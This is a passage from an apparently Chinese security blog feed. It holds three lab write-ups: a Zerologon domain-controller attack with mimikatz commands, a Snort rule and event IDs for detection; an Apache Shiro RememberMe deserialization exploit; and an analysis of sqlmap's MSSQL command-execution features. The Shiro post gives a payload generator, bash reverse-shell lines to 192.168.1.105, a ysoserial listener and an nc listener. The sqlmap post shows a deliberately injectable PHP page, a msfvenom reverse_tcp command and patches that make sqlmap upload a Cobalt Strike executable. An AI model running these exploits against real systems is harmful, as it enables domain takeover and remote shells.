<li><code> lsadump::zerologon /target:dc.hacke.testlab /account:dc$ /exploit  通过zerologon</code>漏洞攻击域控服务器</li>
<li><code>lsadump::dcsync</code></li>
<li><code>lsadump::postzerologon /target:conttosson.locl /account:dc$ #</code>恢复密码</li>
</ol>
<p><img src="/posts/f4b8e3a6/img317949341039073162.jpg" alt="img317949341039073162"></p>
<h2 id="0x03-snort-检测规则"><a href="#0x03-snort-检测规则" class="headerlink" title="0x03 snort 检测规则"></a>0x03 snort 检测规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; any ![139,445] (msg:<span class="string">&quot;Possible Mimikatz Zerologon Attempt&quot;</span>; flow:established,to_server; content:<span class="string">&quot;|00|&quot;</span>; offset:2; content:<span class="string">&quot;|0f 00|&quot;</span>; distance:22; within:2; fast_pattern; content:<span class="string">&quot;|00 00 00 00 00 00 00 00 ff ff 2f 21|&quot;</span>; within:90; reference:url,https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200916; classtype:attempted-admin; sid:20166330; rev:2; metadata:created_at 2020_09_19;)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-pcap包"><a href="#0x04-pcap包" class="headerlink" title="0x04 pcap包"></a>0x04 pcap包</h2><p>利用zerologon漏洞攻击域控的数据包，方便同学们写完规则做测试。</p>
<ul>
<li><p>本站下载地址：<a href="CVE-2020-1472_Zerologon_RPC_NetLogon_NullChallenge_SecChan_6_from_nonDC_to_DC.pcapng">本站下载地址</a></p>
</li>
<li><p>Github地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Nib3Vzc2VhZGVuL1BDQVAtQVRUQUNLL2Jsb2IvbWFzdGVyL0xhdGVyYWwlMjBNb3ZlbWVudC9DVkUtMjAyMC0xNDcyX1plcm9sb2dvbl9SUENfTmV0TG9nb25fTnVsbENoYWxsZW5nZV9TZWNDaGFuXzZfZnJvbV9ub25EQ190b19EQy5wY2Fwbmc=">Github地址<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<h2 id="0x05-windows事件管理器自查"><a href="#0x05-windows事件管理器自查" class="headerlink" title="0x05 windows事件管理器自查"></a>0x05 windows事件管理器自查</h2><p>在未打补丁的域控，重点查看windows事件管理器中，eventid为4742或者4624, 5805</p>
<p>在windows 8月更新中，新增事件ID 5829，5827，5828，5830，5831。蓝队可以重点关注这几个事件ID以方便自查</p>
<ol>
<li>当在初始部署阶段允许存在漏洞的Netlogon安全通道连接时，将生成事件ID 5829。</li>
<li>管理员可以监控事件ID 5827和5828，这些事件ID在存在漏洞的Netlogon连接被拒绝时触发</li>
<li>5830，5831  如果“域控制器：允许易受攻击的Netlogon安全通道连接”组策略允许连接。</li>
</ol>
<p>mimikatz通过zerologon攻击成功后，将会留下事件id为4648。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>Mimikaz</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro RememberMe反序列化</title>
    <url>/posts/61f8a63d/</url>
    <content><![CDATA[<p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。它编号为550的 issue 中爆出了严重的 Java 反序列化漏洞。</p>
<a id="more"></a>

<h1 id="shiro-RememberMe反序列化"><a href="#shiro-RememberMe反序列化" class="headerlink" title="shiro RememberMe反序列化"></a>shiro RememberMe反序列化</h1><p>参考：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGFwZXJwZW4vcC8xMTMxMjY3MS5odG1s">https://www.cnblogs.com/paperpen/p/11312671.html<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvS2tXTDlTZnRDWlNka2dsVzM5UXcwUQ==">https://mp.weixin.qq.com/s/KkWL9SftCZSdkglW39Qw0Q<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。它编号为550的 issue 中爆出了严重的 Java 反序列化漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Apache Shiro &lt;=1.2.4</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>Docker</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<h2 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h2><h3 id="Payload生成脚本"><a href="#Payload生成脚本" class="headerlink" title="Payload生成脚本"></a>Payload生成脚本</h3><ul>
<li>如果缺少模块直接PIP安装即可。<code>python2 shiro.py host:port1</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># No module named Crypto.Cipher，请百度/。。。</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<h3 id="反弹脚本"><a href="#反弹脚本" class="headerlink" title="反弹脚本"></a>反弹脚本</h3><ul>
<li>Bash/Powershell/Python/Perl使用该地址在线生成：<span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">http://www.jackson-t.ca/runtime-exec-payloads.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="Ysoserial工具"><a href="#Ysoserial工具" class="headerlink" title="Ysoserial工具"></a>Ysoserial工具</h3><ul>
<li>下载工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git　<span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -DskipTests <span class="comment"># 如果执行报错,请先检查JAVA版本。ysoserial下载目录pom.xml</span></span><br><span class="line"><span class="comment"># 检查该处版本与自己JAVA版本一致</span></span><br><span class="line">&lt;!-- maximize compatibility --&gt;</span><br><span class="line">	&lt;<span class="built_in">source</span>&gt;1.8&lt;/<span class="built_in">source</span>&gt;</span><br><span class="line">	&lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成的工具在target/目录下ysoserial-0.0.6-SNAPSHOT-all.jar文件</span></span><br></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><ul>
<li>使用shirt.py脚本生成Payload。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">π ~/Desktop/tp_tools/POC ❯ python shiro.py 192.168.1.105:3333</span><br><span class="line">rememberMe=rHxvtUa4SmSR1qg4iLCPtHl7Xgn2Th81yXDL9YhkdQ96bwu/Ej/tIHCcUoiuqaRgv7+BrJn+pOnAmmxdE7eCXTB/m1hEDGesMy2WRntzd1u0WuDSO7VlgCs1/HlyuhUgLULdYY7E+LYrnI3D8ysJWBbVcixNaQky36WYz1DPcQpB/x2ntf8UTWHQ4lHpKbM51EjkKH2WPSil9aXxpq0eJYc2dH2kznP+IcGZJ/VzyT75lvmlyhLVZpUwIbaXj1fzy1Z+ywmeHg4yEqYZWOyrFqoDGxdsvEuQZDa4P4njLo7zjWYA9udX9LFCXyHiUShweAZLPTCEvArwYj61UxQpHuKN1YBGVtGz2bmxYIyYiJdFvE4vNUjU4ibK6WhAo5nrkEQ2w45JWc5UUpuKFGMcFg==</span><br></pre></td></tr></table></figure>

<ul>
<li>在线生成反弹脚本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><ul>
<li>使用<code>ysoserial</code>中JRMP监听模块，监听3333端口<code>注意这里的端口是刚才生成rememberMe值的端口</code>。再加上生成的base64编码脚本。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">π ~/Desktop/tp_tools/POC ❯ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>开启监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>

<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><ul>
<li><p>访问本地80端口(Docker已经启动了)。勾选Remember Me选项，登录系统。我这里截取的是点击logout（参考别人的无法抓到，，即便是自己手动添加不起作用，无法反弹。）</p>
</li>
<li><p>将第一步生成的<code>Remember Me</code>Payload替换到截取的请求包中。发送即可。</p>
</li>
</ul>
<p>其他利用工具请参考<code>宽字节安全</code>公众号。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap关于MSSQL执行命令思考</title>
    <url>/posts/6e52a8fb/</url>
    <content><![CDATA[<p>碰到了很多次sqlmap执行命令无回显，然后试了读取注册表，联动MSF，发现都存在问题，看了下参数，有个BOF，就研究一下。第一次分析有点繁琐。。。</p>
<a id="more"></a>

<h2 id="0x00-环境概述"><a href="#0x00-环境概述" class="headerlink" title="0x00 环境概述"></a>0x00 环境概述</h2><p>环境说明：</p>
<ul>
<li><p>Windows 2003 + MSSQL + PHP5.2.17 (注意刷新缓存 –flush-session)</p>
</li>
<li><p>关闭GPC</p>
</li>
<li><p>构造SQL注入：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$con = mssql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;sa&#x27;</span>,<span class="string">&#x27;server2005&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Erroe&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Connect OK.&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mssql_select_db(<span class="string">&#x27;sqlmap_test&#x27;</span>);</span><br><span class="line"><span class="comment"># $sql = &quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;;</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select id,name from admin where id=&quot;</span>.$id;</span><br><span class="line"></span><br><span class="line">$result = mssql_query($sql);</span><br><span class="line"><span class="comment">/* $row = mssql_fetch_array($result);</span></span><br><span class="line"><span class="comment">echo $row[0]; */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($list=mssql_fetch_array($result))</span><br><span class="line"> &#123;</span><br><span class="line">    print_r($list);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x01-测试sqlmap命令"><a href="#0x01-测试sqlmap命令" class="headerlink" title="0x01 测试sqlmap命令"></a>0x01 测试sqlmap命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br><span class="line">--sql-shell</span><br><span class="line">--os-pwn</span><br><span class="line">--os-smbrelay</span><br><span class="line">--os-bof</span><br><span class="line">--reg-[read&#x2F;add&#x2F;del]</span><br></pre></td></tr></table></figure>

<h3 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h3><p>该参数主要是调用xp_cmdshell执行系统命令。</p>
<ul>
<li><p>执行<code>--os-shell</code>,之后直接在数据库中查看，发现已启用<code>xp_cmdshell</code>。发现能执行命令,但是sqlmap无返回值。只能通过DNS外带。。。</p>
<p><img src="/posts/6e52a8fb/001.png" alt="aa"></p>
</li>
</ul>
<h3 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h3><p>主要用于是执行数据库语句。</p>
<ul>
<li>使用<code>--sql-shell</code>，测试能否通过<code>sql-shell</code>手动开启<code>xp_cmdshell</code>。结果发现无法开启xp_cmdshell。手动开启<code>xp_cmdshell</code>后，<code>sql-shell</code>可以执行命令，sqlmap无返回值。</li>
</ul>
<p><img src="/posts/6e52a8fb/002.png" alt="image-20200428194326597"></p>
<h3 id="–os-pwn"><a href="#–os-pwn" class="headerlink" title="–os-pwn"></a>–os-pwn</h3><p>获取OOBshell、MSF shell、VNC。。。</p>
<ul>
<li><code>--os-pwn</code>获取OOB shell、Meterpreter或VNC。在默认关闭<code>xp_cmdshell</code>情况下，该参数无法开启<code>xp_cmdshell</code>。</li>
</ul>
<p>手动开启<code>xp_cmdshell</code>以后，使用sqlmap参数：<code>--os-pwn --msf-path /opt/msf/</code>,会先上传一个paylaod。查看SQLAMP上传文件的方式一共有4种:PowerShell,Debug,Vbs脚本,Certutil。如果第一种方式失败会提示下一种方式，我这里测试所有的通信方式以及payload，均失败。。。</p>
<p><img src="/posts/6e52a8fb/003.png" alt="image-20200428195336542"></p>
<h3 id="–os-smbrelay"><a href="#–os-smbrelay" class="headerlink" title="–os-smbrelay"></a>–os-smbrelay</h3><p>一次单击提示输入OOB shell、Meterpreter或VNC。该参数提供了五种连接方式，三种payload类型，两个SMB端口。其原理就是调用MSF的<code>windows/smb/smb_relay</code>模块。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> connection <span class="built_in">type</span> <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535</span><br><span class="line">[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP</span><br><span class="line">[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS</span><br><span class="line">[5] Bind TCP: Listen on the database host <span class="keyword">for</span> a connection</span><br><span class="line">&gt;</span><br><span class="line">what is the <span class="built_in">local</span> address? [Enter <span class="keyword">for</span> <span class="string">&#x27;192.168.90.17&#x27;</span> (detected)]</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">local</span> port number <span class="keyword">do</span> you want to use? [7545]</span><br><span class="line"><span class="built_in">which</span> payload <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line"><span class="built_in">which</span> SMB port <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] 139/TCP</span><br><span class="line">[2] 445/TCP (default)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/004.png" alt="image-20200428195514583"></p>
<h3 id="–os-bof"><a href="#–os-bof" class="headerlink" title="–os-bof"></a>–os-bof</h3><p>存储过程缓冲区溢出利用。参数提供了五种连接方式，三种payload，十二种payload编码方式。</p>
<p>经过测试还是失败的。。。</p>
<h3 id="–reg-read-add-del"><a href="#–reg-read-add-del" class="headerlink" title="–reg-[read/add/del]"></a>–reg-[read/add/del]</h3><ul>
<li>读取/添加/修改注册表，会上传.bat文件，文件上传成功，但是并未接受到读取的值..</li>
</ul>
<p><img src="/posts/6e52a8fb/005.png" alt="image-20200429172318871"></p>
<h2 id="0x02-反思"><a href="#0x02-反思" class="headerlink" title="0x02 反思"></a>0x02 反思</h2><p>经过以上测试（关闭GPC下），肯定是有很多疑问的，这里列举一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么--os-shell执行命令后sqlmap无返回值？</span><br><span class="line">为什么--os-pwn参数上传文件失败？</span><br><span class="line">为什么--os-bof利用存储过程缓冲区溢出也失败？</span><br><span class="line">为什么读取注册表时候文件上传了而sqlmap无法获取到？</span><br></pre></td></tr></table></figure>

<h3 id="命令执行反思"><a href="#命令执行反思" class="headerlink" title="命令执行反思"></a>命令执行反思</h3><p>经过以上测试，为什么无法执行命令呢？这里再来复述一遍，找一下为什么这样。</p>
<ul>
<li>首先确定一下：多语句执行，也即是堆叠注入时候的返回值。只返回了第一个查询<code>id=1</code>的内容。</li>
</ul>
<p><img src="/posts/6e52a8fb/006.png" alt="image-20200428201228029"></p>
<ul>
<li>查看直接在数据库执行时的返回，返回了两条结果。</li>
</ul>
<p><img src="/posts/6e52a8fb/007.png" alt="image-20200428201425603"></p>
<ul>
<li>查看源代码，修改<code>/sqlmap/1.4.4/libexec/lib/request/inject.py</code>文件<code>goStacked</code>函数最后一行，输出sqlmap最终执行的payload并测试该paylaod直接在数据库执行时状态。结果发现，数据库执行的语句。发现报错了，无法插入数据，因为列不允许有空值。(–os-shell时候会创建表sqlmapoutput,该表有两个字段id, data)</li>
</ul>
<p><img src="/posts/6e52a8fb/008.png" alt="image-20200428154223773"></p>
<p><img src="/posts/6e52a8fb/009.png" alt="image-20200428202433980"></p>
<ul>
<li>查看表sqlmapoutput,发现字段不允许为空。</li>
</ul>
<p><img src="/posts/6e52a8fb/010.png" alt="image-20200428202953629"></p>
<p>仔细观察上面测试，会发现问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 第一个问题：sqlmap创建的表填充字段时，字段内容不允许为空。</span><br><span class="line">-- 第二个问题：多语句查询时，返回两条结果，而第二条结果包含两个字段内容。</span><br><span class="line">--	比如：	</span><br><span class="line">		select name from admin where id &#x3D;1;EXEC master..xp_cmdshell whoami</span><br><span class="line">		结果：</span><br><span class="line">          zhangsan</span><br><span class="line">          nt authority\system</span><br><span class="line">          NULL</span><br></pre></td></tr></table></figure>

<p>那么问题来了，是不是这样呢？测试：修改sqlmapoutput表的data字段，将其设置为允许为空：</p>
<p><img src="/posts/6e52a8fb/011.png" alt="image-20200428203700136"></p>
<p>发现成功写入。。。</p>
<p>于是利用Sublime全局搜索<code>CREATE TABLE</code>找到MSSQL创建表的语句，将其设置为字段允许为空即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124行，创建表时字段名后加一个NULL</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/012.png" alt="image-20200428203934381"></p>
<p>再来测试：</p>
<p><img src="/posts/6e52a8fb/013.png" alt="image-20200428204410713"></p>
<p>到这里已经可以正确的执行<code>--os-shell</code>等。</p>
<h3 id="注册表操作反思"><a href="#注册表操作反思" class="headerlink" title="注册表操作反思"></a>注册表操作反思</h3><ul>
<li>根据<code>命令执行反思</code>，修改之后，发现读取注册表时候报错。</li>
</ul>
<p><img src="/posts/6e52a8fb/014.png" alt="image-20200430102205170"></p>
<ul>
<li>直接在数据库中执行会因路径中存在空格而报错。</li>
</ul>
<p><img src="/posts/6e52a8fb/015.png" alt="image-20200428114831755"></p>
<p>那么这里就有思路了，将payload上传到其不含有空格或特殊字符的文件夹。(首先尝试PS写.bat,不成功使用VB，因为我03没有PS，所以是VB)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改上传路径：</span></span><br><span class="line"><span class="comment">#	全局搜索字符串：.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27行 注释掉原本语句，改为如下</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/016.png" alt="image-20200430105500903"></p>
<h3 id="联动MSF反思"><a href="#联动MSF反思" class="headerlink" title="联动MSF反思"></a>联动MSF反思</h3><p>首先跟踪代码，查看sqlmap调用MSF过程：</p>
<p><code>/Users/lnx/Desktop/1.4.4/libexec/plugins/generic/takeover.py</code>osPwn函数开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一步：首先测试xp_cmdshell是否开启</span><br><span class="line"></span><br><span class="line">第二步：/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/takeover.py osPwn函数调用MSF生成RAW格式shellcode</span><br><span class="line">文件/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py中函数createMsfShellcode生成shellcode</span><br><span class="line">/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=<span class="number">21453</span> LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.17</span> -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; <span class="string">&quot;/Users/lnx/.sqlmap/output/192.168.90.14/tmpmydff&quot;</span></span><br><span class="line"></span><br><span class="line">第三步：文件/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py <span class="number">617</span>行 函数createMsfShellcode又以字节的格式读取生成的文件。</span><br><span class="line">        self._shellcodeFP = open(self._shellcodeFilePath, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        self.shellcodeString = getText(self._shellcodeFP.read())</span><br><span class="line">        self._shellcodeFP.close()</span><br><span class="line"></span><br><span class="line">第四步：上传，上传又分为三步</span><br><span class="line"><span class="number">1</span>、首先是调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/lib/takeover/metasploit.py 函数uploadShellcodeexec</span><br><span class="line">处理，得到最终上传的payload路径和计划上传到服务器的路径：</span><br><span class="line">/var/folders/xx/<span class="number">6j</span>y_czp97nl76bslj74817d40000gn/T/sqlmapCazl8M8626/tmpKjHjBr32_.exe(最终)</span><br><span class="line">C:/Program Files/Microsoft SQL Server./mssql<span class="number">.1L</span>OG/tmpsecwjq.exe(目标服务)</span><br><span class="line"><span class="number">2</span>、函数uploadShellcodeexec调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/generic/filesystem.py 函数writeFile实现文件上传</span><br><span class="line"><span class="number">3</span>、函数writeFile调用/sqlmap/<span class="number">1.4</span><span class="number">.4</span>/libexec/plugins/dbms./mssqlserver/filesystem.py 函数stackedWriteFile 尝试使用ps、vbs、debug、certutil进行文件上传(我这里是certutil)</span><br><span class="line"><span class="number">4</span>、函数stackedWriteFile在上传时调用了当前文件内的函数_stackedWriteFileCertutilExe进行上传。</span><br><span class="line">	函数_stackedWriteFileCertutilExe：</span><br><span class="line">    首先读取之前处理好的payload.exe(最终的exe)进行Base64编码;</span><br><span class="line">    然后将其写入到目标机的txt文件中;</span><br><span class="line">    之后调用certutil进行解码txt文件输出exe文件，然后执行;</span><br><span class="line">    最后删除txt文件。</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/017.png" alt="image-20200430113607814"></p>
<p><img src="/posts/6e52a8fb/018.png" alt="image-20200430144626472"></p>
<p>这里就是无法收到MSF反弹，直接在CMD中执行命令，发现由于路径空格问题无法成功解码成exe。。。</p>
<p>终于找到问题所在了。</p>
<p><img src="/posts/6e52a8fb/019.png" alt="image-20200429152426764"></p>
<p>那么来修改一下，第一种是利用引号将路径扩起来，第二种是修改文件上传的路径。</p>
<p>这里使用第一种。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376行，添加双引号</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>修改sqlmap解码payload的参数，让其正确识别路径即可。</p>
<p><img src="/posts/6e52a8fb/020.png" alt="image-20200429153738090"></p>
<p>那么尝试加载Cobalt Strike呢？</p>
<p>经过测试，CS生成的RAW格式shellcode替换掉sqlmap调用MSF生成的Raw格式(<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>617行左右。)，无法成功反弹。(未仔细分析生成shellcode后,sqlmap对其处理的逻辑。)</p>
<p>那么直接替换最终上传的exe文件。</p>
<ul>
<li>替换exe,有必要的话可以直接input，接受输入。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py 393行左右，读文件</span></span><br><span class="line"><span class="comment"># 将localFile替换成CS的exe马，即可，我这里是默认的，没有指定x64,指定了x64不上线。。</span></span><br><span class="line">	      <span class="comment"># localFile = &quot;/Users/lnx/Desktop/test.exe&quot;</span></span><br><span class="line">        <span class="keyword">with</span> open(localFile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            localFileContent = f.read()</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/021.png" alt="image-20200430154114803"></p>
<p>这里思路已经给出，可以直接修改sqlmap代码，将payload改成上传powershell或则其他类型payload,以以适用于高版本的操作系统。</p>
<h3 id="存储过程缓冲区溢出反思"><a href="#存储过程缓冲区溢出反思" class="headerlink" title="存储过程缓冲区溢出反思"></a>存储过程缓冲区溢出反思</h3><p>参数：-<code>-os-bof</code></p>
<p>只针对03 的，不过我这里一次都没成功。<code>/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>文件中可以看到具体的代码。</p>
<ul>
<li>首先调用msfvenom生成Raw格式payload然后<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>再617行，以<code>rb</code>读取得到<code>shellcodestring</code>。</li>
<li>再经过<code>/Users/lnx/Desktop/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>70行前后代码处理得到最终的代码。。。然后发送带有Payload的HTTP请求。。。(这里不附录payload,太长了，可以去改文件输出，看一下。)</li>
</ul>
<p>这里复制最终的代码，直接在数据库中执行，发现服务器堆栈溢出。。。。。没有接受到反弹。。</p>
<p><img src="/posts/6e52a8fb/022.png" alt="image-20200429163323085"></p>
<p>因为菜，暂未找到好办法。。。</p>
